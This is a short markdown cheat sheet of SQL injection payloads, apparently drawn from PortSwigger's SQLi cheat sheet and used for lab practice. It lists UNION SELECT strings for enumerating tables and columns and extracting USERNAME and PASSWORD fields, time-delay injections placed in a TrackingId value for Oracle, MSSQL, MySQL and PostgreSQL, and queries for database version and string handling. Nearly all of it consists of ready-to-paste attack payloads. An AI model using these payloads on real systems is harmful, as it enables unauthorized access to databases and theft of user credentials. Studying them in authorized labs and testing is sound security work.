# [Portswigger SQLi CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Leak Database Contents
### Oracle
	' UNION SELECT NULL,NULL FROM DUAL-- -
	' UNION SELECT <TABLE_NAME>, NULL FROM all_tables-- -
	' UNION SELECT <COLUMN_NAME>, NULL FROM all_tab_columns WHERE TABLE_NAME=<TABLE_NAME> -- -
	' UNION SELECT USERNAME, PASSWORD FROM <TABLE_NAME> -- -
### Others
	' UNION SELECT NULL, NULL-- -
	' UNION SELECT <TABLE_NAME>, NULL FROM INFORMATION_SCHEMA.TABLES-- -

## String Concatenation
### Oracle
	'foo'||'bar'
### Microsoft
	'foo'+'bar'
### PostgreSQL
	'foo'||'bar'
### MySQL
	'foo' 'bar' (space between)
	CONCAT('foo','bar')
### Concat Two Results Into One Column
	' UNION SELECT COLUMN1 || '~' || COLUMN2 FROM TABLE-- -

## Conditional Time Delays
### Oracle
	TrackingId=abc'||(SELECT CASE WHEN 1=1 THEN DBMS_LOCK.SLEEP(10) ELSE NULL END FROM dual)-- 
### Microsoft SQL
	TrackingId=abc'; WAITFOR DELAY '0:0:10'-- 
	TrackingId=abc'; IF (1=1) WAITFOR DELAY '0:0:10'-- 
### MySQL
	TrackingId=xyz' OR SLEEP(10)-- 
	TrackingId=xyz'||(SELECT SLEEP(10))-- 
### PostgreSQL
	TrackingId=xyz'||(SELECT pg_sleep(10))-- 
	TrackingId=xyz'||(SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END)-- 

## Substring Function
### Oracle
	SUBSTR('foobar',4,2)

### Others
	SUBSTRING('foobar',4,2)

## DB Version
### Oracle
	SELECT banner FROM v$version
	SELECT version FROM v$instance

### Microsoft
	SELECT @@version

### PostgreSQL
	SELECT version()

### MySQL
	SELECT @@version
